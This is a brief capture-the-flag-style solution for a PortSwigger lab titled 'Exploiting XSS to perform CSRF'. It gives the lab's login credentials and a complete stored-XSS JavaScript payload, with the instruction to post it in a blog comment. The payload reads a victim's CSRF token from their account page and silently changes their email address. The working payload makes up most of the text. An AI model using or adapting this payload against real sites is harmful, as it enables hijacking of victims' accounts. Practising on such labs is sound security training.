# Exploiting XSS to perform CSRF

## This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.

## You can log in to your own account using the following credentials: `wiener:peter`

### Hint:

```javascript
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```

post this in comment
